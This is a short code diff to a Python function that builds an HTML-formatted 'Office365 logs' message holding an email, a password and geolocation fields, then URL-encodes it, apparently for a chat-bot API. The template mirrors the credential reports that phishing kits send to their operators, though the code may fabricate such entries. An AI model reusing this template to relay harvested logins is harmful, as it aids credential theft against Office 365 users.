@@ -57,10 +57,10 @@ def create_msg(text=None):
     
     today = datetime.now().strftime('%d/%m/%Y')
 
-    default = """<b>OFFICE365-HTML-LOGS@ZERO</b>
+    default = f"""<b>OFFICE365-HTML-LOGS@ZERO</b>
     [1] {today}
     <b>USER-AGENT: </b>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/P_RANDHIGHINT Firefox/P_RANDHIGHINT.0
-    <a>seemee: @pwned</a>
+    <a>pwned</a>
     <b>EMAIL: </b><pre>P_EMAIL</pre>
     <b>PASSWORD: </b><a>P_PASSWORD</a>
     <b>Location: </b>IP: P_IP | CITY: P_CITY | COUNTRY: P_COUNTRYCODE | ORG: P_ORG | POSTAL: P_ZIP&parse_mode=html HTTP/2"""
@@ -68,8 +68,8 @@ def create_msg(text=None):
     if text is None:
         text = default
 
+    
     text = text.replace('P_EMAIL', P_EMAIL).replace('P_PASSWORD', P_PASSWORD).replace('P_IP', P_IP).replace('P_ZIP', str(P_ZIP)).replace('P_COUNTRYCODE', P_COUNTRYCODE).replace('P_CITY', P_CITY).replace('P_RANDHIGHINT', P_RANDHIGHINT).replace("P_ORG", P_ORG)
-
 
     text = urllib.parse.quote_plus(text)
     
